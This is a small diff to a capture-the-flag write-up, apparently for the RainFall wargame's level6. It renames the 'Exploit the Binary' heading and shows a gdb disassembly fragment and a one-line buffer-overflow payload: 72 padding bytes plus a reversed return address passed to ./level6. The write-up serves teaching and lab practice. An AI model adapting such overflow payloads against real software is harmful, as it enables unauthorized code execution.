@@ -90,7 +90,7 @@ Dump of assembler code for function n:
    0x08048467 <+19>:    ret
 ```
 
-## Step 2: Exploit the Binary
+## Step 2: Exploiting the Binary
 
 ```bash
 level6@RainFall:~$ ./level6 $(python -c 'print("A" * 72 + "\x08\x04\x84\x54"[::-1])')
